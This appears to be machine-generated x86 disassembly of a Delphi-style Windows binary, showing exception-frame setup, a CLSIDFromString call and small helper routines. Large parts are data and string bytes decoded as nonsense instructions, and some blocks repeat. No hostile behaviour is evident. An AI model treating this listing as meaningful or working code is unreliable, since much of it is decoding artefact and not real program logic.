jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx * 4 ] bh
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
mov ah [ esi + 0x1003 ]
add [ ebp + eax * 4 - 0x5a ] ch
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
jb r-xdata
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ eax * 2 + 0x4f746e49 ]
jbe r-xdata
xor al 0x43
cmp al 0x89
cmpsb [ esi ] [ edi ]
add eax [ eax ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
mov [ esi + 0x1003 ] esp
add [ eax - 0x37fc5978 ] bl
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0xa6899490
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmpsb [ esi ] [ edi ]
add edx [ eax ]
add [ eax ] al
add [ eax - 0x37fc5978 ] bl
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ edx ]
inc ebp
dec ecx
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0x89
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fadd [ edi + 0x1003a6 ]
add [ eax ] al
xor al 0x87
imul ebp [ edi + 0x6e ] 0xa6878090
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
lea eax [ eax ]
adc [ esi + 0x3 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ ecx ]
inc ebp
dec edi
jbe r-xdata
sbb [ ebx - 0x5a ] al
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add ebp esp
aam 0xa6
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ edi ]
inc ebp
dec ecx
outsb
jbe r-xdata
pushfd
mov ah [ esi + 0x3 ]
add [ eax ] al
jae r-xdata
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x65746e69
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx * 4 + 0x1003a6 ] bl
add [ eax ] al
insb
test [ esi - 0x59ba37fd ] esp
insb
outsd
ja r-xdata
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ ebx ]
inc ebp
push edx
popad
outsb
inc ebp
jb r-xdata
add [ esi + eax * 4 - 0x5a ] bh
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ edx ]
inc ebp
dec ebp
popad
je r-xdata
inc eax
add ah ah
mov [ esi + 0x3 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
mov [ esi + 0x1003 ] ah
add [ eax ] al
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
mov [ esi + 0x1003 ] fs
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1003a68b ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ecx * 4 - 0x5a ] dl
add ecx [ eax + eax ]
add [ eax ] al
mov [ esi - 0x59ba37fd ] es
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ 0x6e6f4345 ]
jbe r-xdata
lea eax [ eax ]
push esp
mov esp [ esi + 0x3 ]
mov ah [ esi + 0xc03 ]
add [ esp + eax * 4 + 0x45c803a6 ] cl
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
push eax
outsd
imul ebp [ esi + 0x74 ] 0x8af87265
cmpsb [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
mov ah [ esi + 0x3 ]
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ ebx ]
inc ebp
pop edx
jb r-xdata
add [ eax - 0x37fc5978 ] bl
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ edx ]
inc ebp
push ebp
outsb
jb r-xdata
rol [ edx + ecx * 4 - 0x5a ] 0x3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
mov ah [ esi + 0x1003 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x73 ] bh
cmpsb [ esi ] [ edi ]
add ecx [ eax + eax ]
add [ eax ] al
mov [ esi - 0x59ba37fd ] es
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add edx [ eax ]
inc ebp
inc ecx
outsd
insb
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les ecx [ esi + 0x1003 ]
insb
nop
push 0x3a68c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + eax * 4 - 0x5a ] bh
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ esi + 0x1003 ] cl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x74 ] ch
cmpsb [ esi ] [ edi ]
add edx [ eax ]
add [ eax ] al
add [ esi + eax * 4 - 0x5a ] bh
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ esi ]
inc ebp
push ebx
je r-xdata
push esi
imul ebp [ edi + 0x6c ] 0x6f697461
add [ eax ] al
add [ eax ] al
jb r-xdata
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ ecx ]
inc ebp
inc ebx
outsd
outsb
je r-xdata
sar [ eax - 0x73 ] 0xa6
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
sbb al 0x8d
cmpsb [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] al
arpl [ ebx + 0x4f ] bp
jbe r-xdata
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ eax * 2 + 0x61766e49 ]
insb
imul esp [ ebx + eax * 2 + 0x61 ] 0x408d7473
add [ ebx + ecx * 4 - 0x5a ] dl
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ esi + eax * 4 - 0x5a ] bh
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add edx [ eax ]
inc ebp
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
shl [ eax + 0x3a68b ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x8b
cmpsb [ esi ] [ edi ]
add edx [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x8e
imul ebp [ edi + 0x6e ] 0x6c696146
lea eax [ eax ]
fmul [ ebp + 0x3a6 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fmul [ ebp + 0xc03a6 ]
add [ eax ] al
mov [ esi - 0x59ba37fd ] es
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx * 4 + 0xc03a6 ] bl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call 0xfaa354f
add [ eax ] al
inc ebp
jb r-xdata
outsd
jb r-xdata
arpl [ ebp + eax * 2 + 0x72 ] si
jb r-xdata
add [ eax ] al
mov [ esi - 0x59ba37fd ] es
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ 0x72615645 ]
imul esp [ ecx + 0x6e ] 0x72724574
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x8d
cmpsb [ esi ] [ edi ]
add ecx [ eax + eax ]
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
pushfd
imul ebp [ edi + 0x6e ] 0xa68f0090
add edx [ ecx ]
add ebp [ esi ]
aaa
xor al 0x4
add [ eax ] al
add [ eax + edx + 0x4803a6 ] dl
add [ eax ] al
xchg esp eax
adc [ esi + 0x79530803 ] ah
jae r-xdata
add [ esp + eax * 4 + 0x45c803a6 ] cl
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
mov fs [ esi + 0xc03 ]
jo r-xdata
nop
mov fs [ esi + 0x3 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1003a68e ] dl
add [ eax ] al
add [ esp + eax * 4 + 0x45c803a6 ] cl
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ eax ]
inc ebp
dec edi
push ebx
inc ebp
jb r-xdata
jb r-xdata
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ edx ]
inc ebp
push eax
jb r-xdata
xor al 0x43
add [ esi + eax * 4 - 0x5a ] bh
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
les ecx [ esi + 0x3 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
mov [ esi + 0x1003 ] fs
add [ edi + ecx * 4 + 0x4403a6 ] bl
add [ eax ] al
rcl [ eax ] 0xa6
add ecx eax
je r-xdata
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
cmpsb [ esi ] [ edi ]
add ecx [ esi ]
inc ebp
inc ecx
bound esi [ ebx + 0x74 ]
jb r-xdata
xchg esp eax
adc [ esi + 0x4803 ] ah
add [ eax + edx + 0x530803a6 ] dl
jns r-xdata
outsd
jb r-xdata
jae r-xdata
adc [ ebp + 0x41 ] al
cmpsb [ esi ] [ edi ]
add ecx [ eax + eax ]
add [ eax ] al
mov [ esi - 0x59ba37fd ] es
add edx esp
xor al 0x8e
cmpsb [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ecx * 4 ] dh
loopne r-xdata
je r-xdata
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
insb
jae r-xdata
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
rol [ ebp - 0x5a ] 0x1
push ebp
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ esi ]
inc ebp
dec ecx
outsb
je r-xdata
inc eax
add al ch
mov fs [ esi + 0x3 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0xffffffffa68ff03f ] edi
add ebp [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl [ edi + ecx * 4 ] 0xa6
add edx [ ecx ]
add ebp [ esi ]
cmp [ esp + eax ] dh
add [ eax ] al
add [ eax + edx + 0x4803a6 ] dl
add [ eax ] al
xchg esp eax
adc [ esi + 0x79530803 ] ah
jae r-xdata
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a69174
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_3a65bdc
mov eax [ ebp - 0x4 ]
call sub_3a65bec
push eax
call CLSIDFromString
test eax 0x80000000
sete al
neg al
sbb eax eax
test eax eax
jne r-xdata
outsb
imul edi [ edx + 0x65 ] 0x408d72
pop edi
add [ eax ] al
add eax 0xffffffd4
jmp sub_3a6ede8
cmpsb [ esi ] [ edi ]
add ecx [ eax + edx * 4 ]
cmpsb [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x70 ] bh
cmpsb [ esi ] [ edi ]
add esi [ eax ]
add [ eax ] al
add [ ecx + edx + 0x45c803a6 ] dh
cmpsb [ esi ] [ edi ]
add esi [ ebp * 2 + 0x6d4003a6 ]
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx [ eax + 0x6d ]
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ebx [ ebp + ebp * 8 - 0x5a ]
add esp [ esp + edx * 2 ]
dec ebp
jne r-xdata
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
add eax 0xffffffd4
jmp sub_3a6eee4
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ebp [ eax + 0x1303a6eb ]
push esp
push esp
push 0x64616572
dec esp
outsd
arpl [ ecx + 0x6c ] sp
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6917b
lea eax [ ebp - 0x4 ]
call sub_3a65a7c
retn
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] 0xb
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
xor ecx ecx
call sub_3a690d4
and eax [ ebx ]
add al ch
inc edx
mov ebx 0x5e5fffff
je r-xdata
inc ebx
outsd
jne r-xdata
insb
jae r-xdata
pop ebx
retn
call sub_3a6d410
call sub_3a64c34
pop edi
pop esi
push edx
popad
inc ebp
js r-xdata
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add edx [ edx ]
inc ebp
push ebx
popad
arpl [ gs : ecx + 0x6c ] sp
insb
inc ebp
js r-xdata
sar bh 0xff
insb
jne r-xdata
mov al 0x3
mov eax eax
imul esi [ esi + 0x65 ] 0x74697257
push ebx
jns r-xdata
in al dx
add esp 0xfffffff4
push ebx
arpl [ eax + 0x72 ] bp
outsd
sub_3a68f54
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
sub_3a6900a
cmpsb [ esi ] [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ edx - 0x74 ] dl
adc [ ebx - 0x71 ] bh
sbb eax 0xdf9c4cdb
push edi
loopne r-xdata
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0xffffffffa68ff03f ] edi
add ebp [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a69174
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_3a65bdc
mov eax [ ebp - 0x4 ]
call sub_3a65bec
push eax
call CLSIDFromString
test eax 0x80000000
sete al
neg al
sbb eax eax
test eax eax
jne r-xdata
outsb
imul edi [ edx + 0x65 ] 0x408d72
pop edi
add [ eax ] al
add eax 0xffffffd4
jmp sub_3a6ede8
cmpsb [ esi ] [ edi ]
add ecx [ eax + edx * 4 ]
cmpsb [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x70 ] bh
cmpsb [ esi ] [ edi ]
add esi [ eax ]
add [ eax ] al
add [ ecx + edx + 0x45c803a6 ] dh
cmpsb [ esi ] [ edi ]
add esi [ ebp * 2 + 0x6d4003a6 ]
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx [ eax + 0x6d ]
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ebx [ ebp + ebp * 8 - 0x5a ]
add esp [ esp + edx * 2 ]
dec ebp
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6917b
lea eax [ ebp - 0x4 ]
call sub_3a65a7c
retn
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] 0xb
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
xor ecx ecx
call sub_3a690d4
and eax [ ebx ]
add al ch
inc edx
mov ebx 0x5e5fffff
je r-xdata
pop ebx
retn
call sub_3a6d410
call sub_3a64c34
pop edi
pop esi
push edx
popad
inc ebp
js r-xdata
insb
jne r-xdata
mov al 0x3
mov eax eax
imul esi [ esi + 0x65 ] 0x74697257
push ebx
jns r-xdata
in al dx
add esp 0xfffffff4
push ebx
arpl [ eax + 0x72 ] bp
outsd
sub_3a690a0
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_3a690d4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d410
call sub_3a64c34
pop edi
pop esi
pop ebx
retn
sub_3a69100
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a69174
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_3a65bdc
mov eax [ ebp - 0x4 ]
call sub_3a65bec
push eax
call CLSIDFromString
test eax 0x80000000
sete al
neg al
sbb eax eax
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6917b
lea eax [ ebp - 0x4 ]
call sub_3a65a7c
retn
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] 0xb
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
xor ecx ecx
call sub_3a690d4
sub_3a69184
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
